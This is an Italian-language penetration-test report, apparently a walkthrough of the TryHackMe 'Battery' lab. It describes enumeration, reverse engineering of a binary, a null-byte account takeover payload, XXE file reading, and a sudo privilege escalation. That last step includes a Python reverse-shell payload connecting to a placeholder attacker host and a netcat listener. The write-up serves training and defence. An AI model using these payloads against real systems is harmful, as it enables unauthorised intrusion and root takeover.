# Security Assessment Report – Battery

**Author:** Franco Salvucci  
**Date:** 09/05/2026  
**Environment:** TryHackMe Lab  
**Target:** 10.112.175.27  

---

## 1. Executive Summary

Durante l’attività di security assessment sono state identificate vulnerabilità critiche che consentono la compromissione completa del sistema target.

La catena di attacco sfrutta:

* Reverse engineering di un binario ELF esposto pubblicamente
* Vulnerabilità di account takeover tramite null byte injection
* XXE (XML External Entity Injection)
* Errata configurazione sudo

L’attaccante è in grado di ottenere accesso amministrativo all’applicazione web, recuperare credenziali SSH e infine ottenere privilegi root.

**Impatto:** compromissione completa del sistema

**Livello di rischio:** Critico

---

## 2. Scope

* Target: `10.112.175.27`
* Ambiente: TryHackMe Lab

## Servizi esposti

| Porta | Servizio |
| ----- | -------- |
| 22    | SSH      |
| 80    | HTTP     |

---

## 3. Methodology

L’attività è stata eseguita seguendo una metodologia standard di penetration testing:

1. Reconnaissance
2. Enumeration
3. Reverse Engineering
4. Exploitation
5. Privilege Escalation
6. Post-Exploitation

### Strumenti utilizzati

* Nmap
* Gobuster
* Burp Suite
* Ghidra
* CyberChef
* Netcat

---

## 4. Enumeration

### 4.1 Port Scanning

È stata effettuata una scansione iniziale tramite Nmap:

```bash
nmap -sC -sV TARGET_IP
```

La scansione ha identificato due porte aperte:

* `22/tcp` → SSH
* `80/tcp` → HTTP

---

### 4.2 Web Enumeration

È stata eseguita enumerazione delle directory tramite Gobuster:

```bash
gobuster dir -u http://TARGET_IP \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,txt,html
```

Directory ed endpoint interessanti individuati:

* `/register.php`
* `/admin.php`
* `/forms.php`
* `/report`

---

## 5. Reverse Engineering

### 5.1 Analisi del binario

L’endpoint `/report` permette il download di un binario ELF.

```bash
file report
```

Il file è stato analizzato tramite Ghidra.

Durante l’analisi statica del binario sono stati identificati:

* confronti con credenziali hardcoded
* funzionalità amministrative
* enumerazione utenti
* routine di aggiornamento password

Nel codice sorgente decompilato è stato individuato il seguente confronto:

```text
guest:guest
```

Questa fase ha consentito di comprendere il funzionamento interno dell’applicazione e preparare il successivo attacco di account takeover.

---

## 6. Administrative Access

### 6.1 Null Byte Injection

Il traffico HTTP relativo alla registrazione utenti è stato intercettato tramite Burp Suite.

L’applicazione non valida correttamente l’input email ed è vulnerabile a null byte injection.

Payload utilizzato:

```text
admin@bank.a%00
```

Registrando tale valore è stato possibile ottenere accesso amministrativo all’applicazione.

### Impatto

* Account takeover amministrativo
* Accesso completo al pannello admin
* Possibilità di interagire con funzionalità riservate

---

## 7. XXE Exploitation

### 7.1 Identificazione vulnerabilità

L’endpoint `/forms.php` processa input XML e riflette parte del contenuto nella risposta.

Questa condizione suggerisce una possibile vulnerabilità XXE (XML External Entity Injection).

---

### 7.2 Exploitation

È stato utilizzato un payload XXE per leggere file locali dal server.

File ottenuti:

* `/etc/passwd`
* file PHP applicativi
* configurazioni contenenti credenziali

L’accesso ai file PHP ha permesso il recupero di credenziali SSH valide.

### Impatto

* Arbitrary File Read
* Disclosure di informazioni sensibili
* Recupero credenziali
* Possibile movimento laterale

---

## 8. SSH Access

Utilizzando le credenziali ottenute tramite XXE è stato possibile autenticarsi via SSH.

```bash
ssh cyber@TARGET_IP
```

L’accesso è avvenuto con successo.

---

## 9. Privilege Escalation

### 9.1 Enumerazione sudo

L’utente `cyber` possiede privilegi sudo su uno script Python eseguibile come root senza password.

```bash
sudo -l
```

Output:

```text
(root) NOPASSWD:
/usr/bin/python3 /home/cyber/run.py
```

---

### 9.2 Exploitation

Il file `run.py` è stato sostituito con payload Python malevolo contenente reverse shell.

Esempio payload:

```python
import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("ATT_IP",9001));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("/bin/sh")
```

Listener locale:

```bash
nc -lvnp 9001
```

Esecuzione:

```bash
sudo /usr/bin/python3 /home/cyber/run.py
```

### Risultato

È stata ottenuta una shell root sul sistema target.

---

## 10. Proof of Compromise

### User Flag

```text
/home/cyber/flag1.txt
```

---

### Root Flag

```text
/root/root.txt
```

---

## 11. Conclusion

Il sistema presenta vulnerabilità critiche sia a livello applicativo che di configurazione sistema.

La combinazione di:

* reverse engineering
* account takeover
* XXE
* sudo misconfiguration

consente una compromissione completa del target con difficoltà moderata.

Le principali problematiche individuate includono:

* esposizione di componenti sensibili
* input validation insufficiente
* configurazioni sudo non sicure
* gestione errata dei parser XML

Si raccomanda:

* hardening applicativo
* rimozione di credenziali hardcoded
* disabilitazione delle external entities XML
* revisione delle policy sudo

---

## 12. Appendix

### Tecniche utilizzate

- Web Enumeration  
- Reverse Engineering (Ghidra)  
- Null Byte Injection  
- XXE (XML External Entity Injection)  
- Burp Suite Request Manipulation  
- Arbitrary File Read  
- Credential Harvesting  
- SSH Lateral Movement  
- Linux Privilege Escalation  
- Sudo Misconfiguration Exploitation  

### Strumenti utilizzati

- Nmap  
- Gobuster  
- Burp Suite  
- Ghidra  
- CyberChef  
- Netcat  
- OpenSSH Client  

### Vulnerabilità identificate

| Vulnerabilità | Severity |
|---|---|
| Information Disclosure | High |
| Authentication Bypass | Critical |
| XXE Injection | Critical |
| Sudo Misconfiguration | Critical |

# Note Finali

La macchina includeva anche un secondo metodo alternativo di privilege escalation non trattato nel presente report.

Dettagli tecnici completi disponibili nella directory [labs-battery](/labs/THM/Battery/).